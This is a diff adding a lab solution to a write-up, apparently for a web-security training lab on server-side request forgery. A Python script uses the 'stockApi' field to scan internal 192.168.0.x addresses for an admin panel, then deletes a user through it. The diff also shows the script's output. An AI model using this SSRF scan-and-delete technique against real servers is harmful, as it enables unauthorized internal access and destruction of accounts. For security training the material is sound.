@@ -35,8 +35,105 @@ This makes SSRF vulnerable servers a great entrypoint into a network.
 
 ### Lab Solution
 
-To solve this lab it is seen that the server can be on any server in the space: `192.168.0.1 -- 192.168.0.255`. To find the correct services a scan should be conducted. As the target server is not accesible from the public internet, a script which checks the responses of the SSRF request is created to see if the response resolves to status code 200. If yes, the correct service has been found. The script looks as follows:
+To solve this lab it is seen that the server can be on any server in the space: `192.168.0.1 -- 192.168.0.255`. To find the correct services a scan should be conducted. As the target server is not accesible from the public internet, a script which checks the responses of the "stock" request is created to see if the response resolves to status code 200. If yes, the correct service has been found. The script looks as follows:
 
 ```Python
+import requests
+from bs4 import BeautifulSoup as bs
+url = "https://0ab8007e03d2f3ff804b7b7700d100e7.web-security-academy.net/product/stock"
+admin_url = ""
+headers = {'Cookie': 'session=BrQf4eH9TTxyHZShtrr9bNh1NU3oNYM2'}
+for ip_range in range(240, 256):
+    print("IP: ", ip_range)
+    body = { "stockApi": f'http://192.168.0.{ip_range}:8080/admin' }
+    session = requests.Session()
+    req = session.post(url=url, data=body)
+    if(req.status_code == 200):
+        print("Found admin at url: ", body)
+        soup = bs(req.content)
+        html = soup.prettify()
+        print("Body: ", html)
+        admin_url=f'http://192.168.0.{ip_range}:8080/admin/delete?username=carlos'
+        break
 
+#Delete user with SSRF
+session = requests.Session()
+body = { "stockApi": admin_url }
+req = session.post(url=url, data=body, headers=headers)
+print(req.status_code, " -- ", req.content)
 ```
+
+Exert of script output
+
+```curl
+IP:  240
+IP:  241
+IP:  242
+IP:  243
+IP:  244
+IP:  245
+Found admin at url:  {'stockApi': 'http://192.168.0.245:8080/admin'}
+  <div theme="">
+   <section class="maincontainer">
+    <div class="container is-page">
+     <header class="navigation-header">
+      <section class="top-links">
+       <a href="/">
+        Home
+       </a>
+       <p>
+        |
+       </p>
+       <a href="/admin">
+        Admin panel
+       </a>
+       <p>
+        |
+       </p>
+       <a href="/my-account">
+        My account
+       </a>
+       <p>
+        |
+       </p>
+      </section>
+     </header>
+     <header class="notification-header">
+     </header>
+     <section>
+      <h1>
+       Users
+      </h1>
+      <div>
+       <span>
+        wiener -
+       </span>
+       <a href="/http://192.168.0.245:8080/admin/delete?username=wiener">
+        Delete
+       </a>
+      </div>
+      <div>
+       <span>
+        carlos -
+       </span>
+       <a href="/http://192.168.0.245:8080/admin/delete?username=carlos">
+        Delete
+       </a>
+      </div>
+     </section>
+     <br/>
+     <hr/>
+    </div>
+   </section>
+   <div class="footer-wrapper">
+   </div>
+  </div>
+ </body>
+</html>
+```
+
+In the output of the scan, we are able to view the URL of the delete api function. This is used to delete the user `carlos`
+
+This approach works because of SSRF. The webserver is able to access the internal service, using the call it makes with the URL in the `stockApi` field of the body, when calling `/product/stock`.
+
+Lab is solved after the user is deleted.
